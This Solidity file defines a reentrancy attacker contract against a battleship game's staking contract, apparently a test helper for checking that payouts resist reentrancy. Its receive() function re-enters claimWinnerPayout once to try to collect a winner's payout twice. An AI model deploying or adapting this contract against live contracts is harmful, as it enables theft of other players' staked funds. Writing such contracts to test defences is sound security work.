// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBattleshipStaking {
    function createMatch(bytes32 matchId) external payable;
    function joinMatch(bytes32 matchId) external payable;
    function claimWinnerPayout(bytes32 matchId, bytes calldata signature) external;
}

contract ReentrancyAttacker {
    IBattleshipStaking public stakingContract;
    bytes32 public targetMatchId;
    bytes public targetSignature;
    bool public attackTriggered;

    constructor(address _stakingContract) {
        stakingContract = IBattleshipStaking(_stakingContract);
    }

    function createMatch(bytes32 matchId) external payable {
        stakingContract.createMatch{value: msg.value}(matchId);
    }

    function attack(bytes32 matchId, bytes calldata signature) external {
        targetMatchId = matchId;
        targetSignature = signature;
        stakingContract.claimWinnerPayout(matchId, signature);
    }

    receive() external payable {
        if (!attackTriggered) {
            attackTriggered = true;
            stakingContract.claimWinnerPayout(targetMatchId, targetSignature);
        }
    }
}
